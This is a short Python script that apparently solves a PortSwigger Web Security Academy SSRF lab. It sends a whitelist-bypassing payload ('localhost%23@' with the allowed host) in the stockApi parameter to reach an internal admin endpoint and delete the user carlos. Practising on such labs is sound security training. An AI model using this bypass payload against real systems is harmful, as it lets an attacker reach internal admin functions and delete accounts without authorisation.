#########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 19/10/2023
#
# Lab: SSRF with whitelist-based input filter
#
# Steps: 1. Inject payload into 'stockApi' parameter to delete carlos using SSRF
#           with whitelist-based input filter bypass
#        2. Check that carlos doesn't exist anymore in the admin panel
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore

#########
# Main
#########

# change this to your lab URL
url = "https://0a1a00fc049b2d40813c5cf600d4002d.web-security-academy.net"

print(Fore.BLUE + "⟪#⟫ Injection point: " + Fore.YELLOW + "stockApi")

# payload to delete carlos using SSRF with whitelist-based input filter bypass
payload = "http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos"

# data to send via POST
data =  {
    "stockApi": payload
}

try:
    # fetch the page with the injected payload
    requests.post(f"{url}/product/stock", data)

except:
    print(Fore.RED + "[!] Failed to fetch the page with the injected payload through exception")
    exit(1)

print(Fore.WHITE + "❯ Injecting payload to delete carlos using SSRF with whitelist-based input filter bypass.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")


